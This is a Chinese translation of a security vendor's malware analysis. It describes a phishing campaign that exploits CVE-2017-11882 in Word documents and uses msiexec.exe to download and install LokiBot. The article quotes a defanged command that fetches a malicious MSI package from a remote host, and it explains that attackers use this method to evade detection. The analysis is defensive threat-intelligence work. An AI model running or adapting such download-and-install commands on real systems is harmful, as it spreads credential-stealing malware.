![1.png](https://image.3001.net/images/20180301/15198885279679.png!small)

## 写在前面的话

2017年11月，微软曾修复了漏洞[CVE-2017-11882](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882)，这是一个存在于Microsoft
Office中的远程代码执行漏洞。但是此次的漏洞修复并不能组织类似[Cobalt](https://blog.trendmicro.com/trendlabs-security-intelligence/cobalt-spam-runs-use-macros-cve-2017-8759-exploit/)这样的网络犯罪组织利用该漏洞实施攻击。而该组织会利用该漏洞传播
[FAREIT](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/fareit)、[Ursnif](http://blog.trendmicro.com/trendlabs-security-intelligence/new-malicious-macro-evasion-tactics-exposed-ursnif-spam-mail/)和[破解版的Loki infostealer](https://blog.trendmicro.com/trendlabs-security-intelligence/cve-2017-11882-exploited-deliver-cracked-version-loki-infostealer/)（一款能够窃取加密货币钱包的键盘记录器）。

近期，我们发现又有攻击者开始利用漏洞[CVE-2017-11882](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882)来实施攻击了，但这一次他们使用的是一种非常见的安装方法：即通过微软Windows操作系统中的Windows
Installer服务。这跟之前那些使用mshta.exe（用于下载并执行Payload）运行Powershell脚本并利用漏洞实施攻击的恶意软件不同，我们所发现的这种攻击利用的是Windows
Installer服务中的msiexec.exe。

## 感染链

下图显示的是这种攻击技术的感染链：

![2.png](https://image.3001.net/images/20180301/1519888538406.png!small)

我们所分析的样本似乎来自于一次垃圾邮件活动。它首先会向目标用户发送一封电子邮件，并让目标用户确认一份支付账单，然后在邮件中对用户进行“恐吓”。邮件内容是用韩文写的，翻译过来的意思大概是：“你好，你的电脑可能已经感染了病毒或恶意软件，请你检查一下。”除此之外，邮件中还包含了一个标题为“Payment
copy.Doc”的附件（趋势科技将其标记为TROJ_CVE201711882.SM），而这个文件中就包含了漏洞CVE-2017-11882的漏洞利用代码。

邮件内容如下图所示：

![3.png](https://image.3001.net/images/20180301/15198885467191.png!small)

用户打开这个Word文档之后，便会看到如下图所示的内容：

![4.png](https://image.3001.net/images/20180301/15198885535213.png!small)

成功利用该漏洞之后，攻击者将会通过Windows Installer下载并安装一个名为zus.msi的恶意MSI包，运行命令如下：

    
    
    Callcmd.exe /c msiexec /q /I “hxxps[:]//www[.]uwaoma[.]info/zus.msi

Msiexec会下载并安装一个名为MSIFD83.tmp的文件：

![5.png](https://image.3001.net/images/20180301/15198885657203.png!small)

安装后的MSIL代码如下：

![6.png](https://image.3001.net/images/20180301/1519888573728.png!small)

下载之后，Windows
Installer（msiexec.exe）将会继续在系统中安装一份MSIL或Delphi代码，而这份恶意代码将会作为实际Payload的加载器来使用。需要注意的是，恶意数据包还采用了一个压缩层，所以文件扫描引擎需要不断进行迭代或枚举才可以检测到其恶意性。不过想要识别其真实Payload还是比较困难的，因为它的MSIL或Delphi代码是经过了高度混淆处理的。

运行之后，代码会启用一个随机命名的实例，而这个实例替换恶意软件的Payload。

![7.png](https://image.3001.net/images/20180301/1519888585153.png!small)

目前，我们发现攻击者主要利用这项技术来传播LokiBot（TROJ_LOKI.SMA），不过根据我们对其模块的分析结果来看，它还可以用来传播其他的Payload。

下图显示的是我们所识别的LokiBot变种样本：

![8.png](https://image.3001.net/images/20180301/15198885978330.png!small)

## 为什么攻击者需要使用新的恶意Payload安装方法？

安全产品的检测效率越来越高了，而且它们都会监控类似Wscript、Powershell、mshta.exe、Winword.exe以及其他一些攻击者可能会用来安装恶意Payload的程序。由于这些方法已经是网络犯罪领域中的热门方法了，所以它们被发现的概率也相应上升了。不过，使用msiexec.exe来下载恶意MSI数据包的情况并不是大多数恶意软件会使用的方法。

虽然Andromeda僵尸网络（ANDROM恶意软件家族）也会使用msiexec.exe，但使用安装器的方法还是跟LokiBot不一样的，因为Andromeda会将恶意代码注入到msiexec.exe中来下载Payload。除此之外，Andromeda下载并更新了Payload之后，它会立即下载并执行一个PE文件。这种方法需要使用的MSI数据包，而msiexec.exe会将其识别为可安装的数据包，因此它还会使用到Windows
Installer。

实际上，恶意软件并不一定要通过MSI数据包来安装自身，跟绝大多数使用msiexec.exe的恶意软件不同，我们所分析的样本并不需要进行代码修改，它使用的就是Windows
Installer来安装恶意软件。

因此我们认为，恶意软件之所以会选择使用这种特殊的安装方式，主要是因为恶意软件开发者设计出了新型的安全检测绕过方法。

## 缓解方案

由于这种攻击的开始阶段利用的还是钓鱼邮件，所以广大用户可以通过抵御钓鱼邮件的方式来缓解这种攻击所带来的影响。除此之外，用户在阅读任意邮件时，一定要仔细阅读邮件中文字所使用的措词，如果发现了语法错误或其他问题，就一定要小心了。

 *** 参考来源：[trendmicro](https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

